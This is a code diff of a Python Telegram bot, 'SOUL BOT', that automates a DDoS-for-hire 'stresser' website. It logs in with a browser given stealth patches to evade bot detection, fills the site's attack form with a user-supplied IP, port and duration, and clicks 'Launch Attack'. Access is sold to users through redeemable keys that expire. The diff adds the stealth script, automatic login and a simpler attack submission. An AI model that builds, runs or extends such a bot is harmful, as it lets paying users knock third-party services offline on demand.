@@ -1,7 +1,5 @@
 """
-SOUL BOT - Telegram Stress Testing Bot
-Deployment: Railway / VPS
-Version: 2.2 - Railway Optimized
+SOUL BOT - Railway Optimized Version
 """
 
 import asyncio
@@ -16,15 +14,9 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 from playwright.async_api import async_playwright
 
-# --- Configuration from Environment Variables ---
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    raise ValueError("BOT_TOKEN environment variable is required!")
-
+# --- Configuration ---
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 OWNER_ID = int(os.environ.get("OWNER_ID", "0"))
-if OWNER_ID == 0:
-    raise ValueError("OWNER_ID environment variable is required!")
-
 HEADLESS_MODE = os.environ.get("HEADLESS_MODE", "true").lower() == "true"
 LOGIN_TOKEN = os.environ.get("LOGIN_TOKEN", "")
 
@@ -60,7 +52,7 @@ def load_data():
         if os.path.exists(DATA_JSON):
             with open(DATA_JSON, 'r') as f:
                 data = json.load(f)
-            logger.info(f"Loaded data: {len(data.get('approved_users', {}))} users")
+            logger.info(f"Data loaded: {len(data.get('approved_users', {}))} users")
     except Exception as e:
         logger.error(f"Error loading data: {e}")
 
@@ -71,17 +63,6 @@ def save_data():
         logger.info("Data saved")
     except Exception as e:
         logger.error(f"Error saving data: {e}")
-
-def get_time_left(expiry_str):
-    try:
-        expiry = datetime.strptime(expiry_str, "%Y-%m-%d")
-        now = datetime.now()
-        delta = expiry - now
-        if delta.days < 0:
-            return "⚠️ Expired"
-        return f"✅ {delta.days} days"
-    except:
-        return "N/A"
 
 def generate_random_key():
     characters = string.ascii_letters + string.digits
@@ -143,6 +124,8 @@ async def initialize_browser():
                 '--disable-gpu',
                 '--window-size=1920,1080',
                 '--disable-blink-features=AutomationControlled',
+                '--disable-web-security',
+                '--disable-features=VizDisplayCompositor',
             ]
         )
         
@@ -153,14 +136,20 @@ async def initialize_browser():
         
         page = await context.new_page()
         
+        # Add stealth script
         await page.add_init_script("""
             Object.defineProperty(navigator, 'webdriver', {
                 get: () => undefined
             });
+            Object.defineProperty(navigator, 'plugins', {
+                get: () => [1, 2, 3, 4, 5]
+            });
+            window.chrome = { runtime: {} };
         """)
         
         logger.info("Browser initialized successfully")
         
+        # Auto-login if token provided
         if LOGIN_TOKEN and not logged_in:
             await auto_login()
         
@@ -178,13 +167,22 @@ async def auto_login():
         await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=30000)
         await asyncio.sleep(2)
         
+        current_url = page.url
+        if "dashboard" in current_url or "attack" in current_url:
+            logged_in = True
+            logger.info("Already logged in!")
+            return
+        
         await page.fill("#token", LOGIN_TOKEN)
         await asyncio.sleep(1)
+        await page.click("button[type='submit']")
+        await asyncio.sleep(3)
         
         current_url = page.url
         if "dashboard" in current_url or "attack" in current_url:
             logged_in = True
             logger.info("Auto-login successful!")
+            
     except Exception as e:
         logger.error(f"Auto-login error: {e}")
 
@@ -396,7 +394,7 @@ async def process_approve(update: Update, text: str):
     try:
         parts = text.strip().split()
         if len(parts) != 2:
-            await update.message.reply_text("❌ Invalid format. Use: `user_id days`")
+            await update.message.reply_text("❌ Invalid format.")
             return
 
         target_id, days = parts[0], int(parts[1])
@@ -421,8 +419,6 @@ async def process_disapprove(update: Update, text: str):
             del data["approved_users"][str(target_id)]
             save_data()
             await update.message.reply_text(f"❌ User {target_id} disapproved!")
-        else:
-            await update.message.reply_text(f"User {target_id} not found in approved users.")
         user_state.pop(user_id, None)
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
@@ -432,7 +428,7 @@ async def process_add_admin(update: Update, text: str):
     try:
         parts = text.strip().split()
         if len(parts) != 2:
-            await update.message.reply_text("❌ Invalid format. Use: `user_id days`")
+            await update.message.reply_text("❌ Invalid format.")
             return
 
         target_id, days = parts[0], int(parts[1])
@@ -457,8 +453,6 @@ async def process_remove_admin(update: Update, text: str):
             del data["admins"][target_id]
             save_data()
             await update.message.reply_text(f"🚫 Admin {target_id} removed!")
-        else:
-            await update.message.reply_text(f"User {target_id} is not an admin.")
         user_state.pop(user_id, None)
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {e}")
@@ -487,13 +481,13 @@ async def process_run(update: Update, text: str):
     user_id = update.effective_user.id
 
     if not logged_in or not page:
-        await update.message.reply_text("❌ Not logged in. Please wait for login.")
+        await update.message.reply_text("❌ Not logged in. Please login first.")
         return
 
     try:
         parts = text.strip().split()
         if len(parts) != 3:
-            await update.message.reply_text("❌ Invalid format. Use: `IP PORT TIME`")
+            await update.message.reply_text("❌ Invalid format.")
             return
 
         ip, port, duration = parts
@@ -503,23 +497,14 @@ async def process_run(update: Update, text: str):
         await page.goto("https://satellitestress.st/attack", wait_until="domcontentloaded", timeout=30000)
         await asyncio.sleep(2)
 
-        # Try to fill the form
-        try:
-            await page.fill("input[placeholder='104.29.138.132']", ip, timeout=5000)
-            await asyncio.sleep(0.3)
-            await page.fill("input[placeholder='80']", port, timeout=5000)
-            await asyncio.sleep(0.3)
-            await page.fill("input[placeholder='60']", duration, timeout=5000)
-            await asyncio.sleep(0.3)
-            await page.click("button:has-text('Launch Attack')", timeout=5000)
-        except:
-            # Try alternative selectors
-            inputs = await page.query_selector_all("input")
-            if len(inputs) >= 3:
-                await inputs[0].fill(ip)
-                await inputs[1].fill(port)
-                await inputs[2].fill(duration)
-            await page.click("button:has-text('Launch')")
+        # Fill form
+        await page.fill("input[placeholder='104.29.138.132']", ip)
+        await asyncio.sleep(0.3)
+        await page.fill("input[placeholder='80']", port)
+        await asyncio.sleep(0.3)
+        await page.fill("input[placeholder='60']", duration)
+        await asyncio.sleep(0.5)
+        await page.click("button:has-text('Launch Attack')")
 
         await asyncio.sleep(2)
         await update.message.reply_text(f"🚀 Attack Started!\n🎯 {ip}:{port}\n⏱️ {duration}s")
@@ -571,6 +556,7 @@ async def start_login_flow(message):
                 await message.reply_text("❌ Failed to initialize browser.")
                 return
 
+        await message.reply_text("🌐 Loading login page...")
         await page.goto("https://satellitestress.st/login", wait_until="domcontentloaded", timeout=30000)
         await asyncio.sleep(2)
 
@@ -581,20 +567,17 @@ async def start_login_flow(message):
             await message.reply_text("✅ Already logged in!")
             return
 
-        await message.reply_text(
-            "🔐 Login Required\n\n"
-            "Send your token to login:\n"
-            "Example: `your_token_here`"
-        )
+        await message.reply_text("🔐 Login Required\n\nPlease send your token:")
         user_state[OWNER_ID] = {'step': 'waiting_token'}
 
     except Exception as e:
-        await message.reply_text(f"❌ Login Error: {e}")
+        logger.error(f"Login flow error: {e}")
+        await message.reply_text(f"❌ Login Error: {str(e)[:100]}")
 
 async def enter_token(update: Update, token: str):
     global page
     try:
-        await page.fill("#token", token, timeout=30000)
+        await page.fill("#token", token)
         await asyncio.sleep(1)
 
         captcha_present = await page.query_selector("input[aria-label='Enter captcha answer']")
@@ -623,7 +606,7 @@ async def enter_token(update: Update, token: str):
 async def enter_captcha(update: Update, captcha: str):
     global page, logged_in
     try:
-        await page.fill("input[aria-label='Enter captcha answer']", captcha, timeout=30000)
+        await page.fill("input[aria-label='Enter captcha answer']", captcha)
         await asyncio.sleep(0.5)
         await page.click("button[type='submit']")
         await asyncio.sleep(3)
@@ -644,7 +627,7 @@ async def check_status(message):
     if logged_in:
         await message.reply_text("✅ Status: LOGGED IN 🟢\nReady for attacks!")
     else:
-        await message.reply_text("❌ Status: NOT LOGGED IN 🔴\nUse Login button to authenticate.")
+        await message.reply_text("❌ Status: NOT LOGGED IN 🔴")
 
 async def show_stats(message, user_id):
     approved_count = len(data.get("approved_users", {}))
@@ -653,26 +636,24 @@ async def show_stats(message, user_id):
     redeemed_count = sum(1 for k in data.get("keys", {}).values() if k.get("redeemed"))
 
     await message.reply_text(
-        f"📊 System Statistics\n\n"
-        f"✅ Approved Users: {approved_count}\n"
+        f"📊 Statistics\n\n"
+        f"✅ Approved: {approved_count}\n"
         f"👮 Admins: {admin_count}\n"
-        f"🎟️ Total Keys: {key_count}\n"
-        f"✔ Redeemed Keys: {redeemed_count}"
+        f"🎟️ Keys: {key_count}\n"
+        f"✔ Redeemed: {redeemed_count}"
     )
 
 async def show_my_status(message, user_id):
     if str(user_id) in data.get("approved_users", {}):
         expiry = data["approved_users"][str(user_id)].get("expiry")
-        time_left = get_time_left(expiry)
-        await message.reply_text(f"✅ Status: Approved\nExpires: {expiry}\n{time_left}")
+        await message.reply_text(f"✅ Approved\nExpires: {expiry}")
     elif str(user_id) in data.get("admins", {}):
         expiry = data["admins"][str(user_id)].get("expiry")
-        time_left = get_time_left(expiry)
-        await message.reply_text(f"👮 Status: Admin\nExpires: {expiry}\n{time_left}")
+        await message.reply_text(f"👮 Admin\nExpires: {expiry}")
     elif is_owner(user_id):
-        await message.reply_text("🔑 Status: Owner\nAccess: Unlimited")
+        await message.reply_text("🔑 Owner\nAccess: Unlimited")
     else:
-        await message.reply_text("❌ Status: No Access\nRedeem a key to get access!")
+        await message.reply_text("❌ No Access\nRedeem a key!")
 
 async def logout_session(message):
     global logged_in
@@ -681,7 +662,7 @@ async def logout_session(message):
     await message.reply_text("✅ Browser session closed.")
 
 # --- Main Function ---
-async def main_async():
+async def run_bot():
     load_data()
     
     app = Application.builder().token(BOT_TOKEN).build()
@@ -690,7 +671,7 @@ async def main_async():
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
-    logger.info(f"=== SOUL BOT STARTED ===")
+    logger.info("=== SOUL BOT STARTED ===")
     logger.info(f"Owner ID: {OWNER_ID}")
     logger.info(f"Headless mode: {HEADLESS_MODE}")
     logger.info(f"Bot token: {BOT_TOKEN[:10]}...")
@@ -701,13 +682,21 @@ async def main_async():
     
     logger.info("Bot is polling for updates...")
     
-    # Keep running
-    while True:
-        await asyncio.sleep(3600)
+    try:
+        while True:
+            await asyncio.sleep(60)
+            save_data()
+            logger.info("Heartbeat: Bot is running")
+    except asyncio.CancelledError:
+        logger.info("Bot stopped")
+    finally:
+        await close_browser()
+        await app.stop()
+        await app.shutdown()
 
 def main():
     try:
-        asyncio.run(main_async())
+        asyncio.run(run_bot())
     except KeyboardInterrupt:
         logger.info("Bot stopped by user")
     except Exception as e:
